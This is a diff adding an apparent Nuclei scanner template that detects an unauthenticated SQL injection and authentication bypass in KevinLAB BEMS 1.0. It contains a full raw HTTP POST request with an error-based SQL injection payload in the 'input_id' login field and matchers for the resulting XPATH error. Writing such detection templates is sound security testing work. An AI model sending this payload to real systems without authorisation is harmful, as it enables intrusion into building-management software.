@@ -1,0 +1,37 @@
+id: kevinlab-bems-sqli
+
+info:
+  name: KevinLAB BEMS 1.0 Unauthenticated SQL Injection/Authentication Bypass
+  author: gy741
+  severity: high
+  description: The application suffers from an unauthenticated SQL Injection vulnerability. Input passed through 'input_id' POST parameter in '/http/index.php' is not properly sanitised before being returned to the user or used in SQL queries.
+  reference: |
+    - https://www.zeroscience.mk/en/vulnerabilities/ZSL-2021-5655.php
+    - https://www.exploit-db.com/exploits/50146
+    - https://packetstormsecurity.com/files/163572/
+  tags: kevinlab,sqli
+
+requests:
+  - raw:
+      - |
+        POST /http/index.php HTTP/1.1
+        Host: {{Hostname}}
+        Accept: application/json, text/javascript, */*; q=0.01
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Safari/537.36
+        Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+        Accept-Encoding: gzip, deflate
+        Accept-Language: ko-KR,ko;q=0.9,en-US;q=0.8,en;q=0.7
+        Connection: close
+
+        requester=login&request=login&params=[{"name":"input_id","value":"USERNAME' AND EXTRACTVALUE(1337,CONCAT(0x5C,0x5A534C,(SELECT (ELT(1337=1337,1))),0x5A534C)) AND 'joxy'='joxy"},{"name":"input_passwd","value":"PASSWORD"},{"name":"device_id","value":"xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxx"},{"name":"checked","value":false},{"name":"login_key","value":""}]
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        words:
+          - "XPATH syntax error"
+          - ": '\\ZSL1ZSL'"
+        condition: and
+      - type: status
+        status:
+          - 200
